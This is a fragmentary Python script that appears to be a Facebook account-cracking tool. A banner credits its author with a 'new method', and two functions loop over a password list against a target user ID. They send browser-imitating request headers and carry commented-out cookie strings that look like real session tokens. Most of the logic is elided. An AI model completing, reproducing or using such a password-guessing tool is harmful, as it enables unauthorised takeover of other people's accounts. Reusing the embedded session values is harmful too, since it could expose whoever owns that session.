...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Md Purno Shah ")
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=Per0Y9fUj5SCI7nY5kNnLkPu; sb=Per0Y2RiqavlGE_nKulvlada; locale=en_US; dpr=1.75; vpd=v1%3B772x412x1.75; wd=412x772; fr=0mvuQnAU7tUXO6FDl.AWWTSOtn3EHxPAprdy2BL63qT5s.Bj_M2L.Ou.AAA.0.0.Bj_M2W.AWUwFn4vTls',
...
def c(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=Per0Y9fUj5SCI7nY5kNnLkPu; sb=Per0Y2RiqavlGE_nKulvlada; locale=en_US; dpr=1.75; vpd=v1%3B772x412x1.75; m_pixel_ratio=1.75; wd=412x772; fr=0mvuQnAU7tUXO6FDl.AWWTSOtn3EHxPAprdy2BL63qT5s.Bj_M2L.Ou.AAA.0.0.Bj_M2W.AWUwFn4vTls',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
